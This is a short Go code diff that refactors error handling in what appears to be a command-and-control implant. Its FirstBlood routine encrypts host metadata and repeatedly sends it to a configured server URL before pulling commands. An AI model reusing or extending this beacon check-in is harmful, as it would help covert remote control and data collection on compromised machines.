@@ -228,9 +228,16 @@ func MakeMetaInfo() []byte {
 	return packetToEncrypt
 }
 
-func FirstBlood() bool {
-	encryptedMetaInfo, _ = EncryptedMetaInfo()
-	encryptedMetaInfo, _ = crypt.EncryptMultipleTypes(encryptedMetaInfo, config.Http_get_metadata_crypt)
+func FirstBlood() error {
+	var err error
+	encryptedMetaInfo, err = EncryptedMetaInfo()
+	if err != nil {
+		return err
+	}
+	encryptedMetaInfo, err = crypt.EncryptMultipleTypes(encryptedMetaInfo, config.Http_get_metadata_crypt)
+	if err != nil {
+		return err
+	}
 	for {
 		data, err := HttpGet(config.GetUrl, encryptedMetaInfo, config.Http_get_metadata_crypt)
 		if err == nil {
@@ -242,7 +249,7 @@ func FirstBlood() bool {
 		time.Sleep(500 * time.Millisecond)
 	}
 	time.Sleep(config.WaitTime)
-	return true
+	return err
 }
 
 func PullCommand() ([]byte, error) {
